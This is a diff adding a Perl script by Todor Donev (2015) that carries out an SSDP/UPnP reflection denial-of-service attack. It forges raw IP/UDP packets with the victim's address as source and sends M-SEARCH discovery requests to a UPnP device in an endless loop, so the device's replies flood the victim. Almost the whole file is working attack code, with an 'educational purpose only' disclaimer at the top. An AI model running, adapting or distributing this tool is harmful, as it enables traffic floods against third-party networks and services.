@@ -1,0 +1,134 @@
+#!/usr/bin/perl
+#
+#  upnpd M-SEARCH ssdp:discover reflection 
+#
+#  Copyright 2015 (c) Todor Donev 
+#  todor.donev@gmail.com
+#  http://www.ethical-hacker.org/
+#  https://www.facebook.com/ethicalhackerorg
+#
+#  The SSDP protocol can discover Plug & Play devices, 
+#  with uPnP (Universal Plug and Play). SSDP is HTTP 
+#  like protocol and work with NOTIFY and M-SEARCH 
+#  methods.
+#
+#
+#  Disclaimer:
+#  This or previous program is for Educational
+#  purpose ONLY. Do not use it without permission.
+#  The usual disclaimer applies, especially the
+#  fact that Todor Donev is not liable for any
+#  damages caused by direct or indirect use of the
+#  information or functionality provided by these
+#  programs. The author or any Internet provider
+#  bears NO responsibility for content or misuse
+#  of these programs or any derivatives thereof.
+#  By using these programs you accept the fact
+#  that any damage (dataloss, system crash,
+#  system compromise, etc.) caused by the use
+#  of these programs is not Todor Donev's
+#  responsibility.
+#
+#  Use at your own risk and educational 
+#  purpose ONLY!
+#
+#  Wireshark: 
+#  udp.port eq 1900 || frame contains "HTTP/1.1 200 OK"
+#
+#  See also:
+#  SSDP Reflection DDoS Attacks 
+#  http://tinyurl.com/mqwj6xt
+#
+
+use Socket;
+
+if ( $< != 0 ) {
+   print "Sorry, must be run as root!\n";
+   print "This script use RAW Socket.\n"; 
+   exit;
+}
+
+my $ssdp 	= (gethostbyname($ARGV[0]))[4];		# IP Address Source	(32 bits)
+my $victim 	= (gethostbyname($ARGV[1]))[4];		# IP Address Source	(32 bits)
+
+print "[ upnpd M-SEARCH ssdp:discover reflection ]\n";
+if (!defined $ssdp || !defined $victim) {
+    print "[ Usage:  $0 <upnpd> <victim>\n";
+    print "[  <todor.donev\@gmail.com>   Todor Donev  ]\n";
+    exit;
+}
+print "[ Sending SSDP packets: $ARGV[0] -> $ARGV[1]\n";
+socket(RAW, PF_INET, SOCK_RAW, 255) or die $!;
+setsockopt(RAW, 0, 1, 1) or die $!;
+main();
+
+    # Main program
+sub main {
+    my $packet;
+    
+    $packet = iphdr();
+    $packet .= udphdr();
+    $packet .= payload();
+    # b000000m...
+    send_packet($packet);
+}
+
+    # IP header (Layer 3)
+sub iphdr {
+    my $ip_ver         	= 4;				# IP Version 4			(4 bits)
+    my $iphdr_len      	= 5;				# IP Header Length		(4 bits)
+    my $ip_tos         	= 0;				# Differentiated Services	(8 bits)
+    my $ip_total_len   	= $iphdr_len + 20;		# IP Header Length + Data	(16 bits)
+    my $ip_frag_id     	= 0;				# Identification Field		(16 bits)
+    my $ip_frag_flag   	= 000;				# IP Frag Flags (R DF MF)	(3 bits)
+    my $ip_frag_offset 	= 0000000000000;		# IP Fragment Offset		(13 bits)
+    my $ip_ttl         	= 255;				# IP TTL			(8 bits)
+    my $ip_proto       	= 17;				# IP Protocol			(8 bits)
+    my $ip_checksum    	= 0;				# IP Checksum			(16 bits)
+    # IP Packet construction
+	my $iphdr	= pack(
+			'H2 H2 n n B16 h2 c n a4 a4',
+			$ip_ver . $iphdr_len, $ip_tos, $ip_total_len,
+			$ip_frag_id, $ip_frag_flag . $ip_frag_offset,
+			$ip_ttl, $ip_proto, $ip_checksum,
+			$victim, $ssdp
+			);
+			return $iphdr;
+}
+
+    # UDP header (Layer 4)
+sub udphdr {
+    my $udp_src_port	= 31337;			# UDP Sort Port		(16 bits) (0-65535)
+    my $udp_dst_port	= 1900;				# UDP Dest Port		(16 btis) (0-65535)
+    my $udp_len		= 8 + length(payload());	# UDP Length		(16 bits) (0-65535)
+    my $udp_checksum 	= 0;				# UDP Checksum		(16 bits) (XOR of header)
+
+    # UDP Packet
+    my $udphdr		= pack(
+			'n n n n',
+			$udp_src_port, $udp_dst_port,
+			$udp_len, $udp_checksum
+			);
+	return $udphdr;
+}
+
+    # SSDP HTTP like (Layer 7)
+sub payload {
+    my $data;
+    $data .= "M-SEARCH * HTTP\/1.1\r\n";
+  #  $data .= "HOST:239.255.255.250:1900\r\n";		# Multicast address
+    $data .= "ST:upnp:rootdevice\r\n";			# Search target, search for root devices only  
+    $data .= "MAN:\"ssdp:discover\"\r\n";
+  #  $data .= "MX:3\r\n\r\n";				# Seconds to delay response
+    my $payload = pack('a' . length($data), $data);
+return $payload;
+}
+
+sub send_packet {
+    while(1){
+    select(undef, undef, undef, 0.10);			# Sleeping 100 milliseconds
+    send(RAW, $_[0], 0, pack('Sna4x8', PF_INET, 60, $ssdp)) or die $!;
+   }
+}
+
+
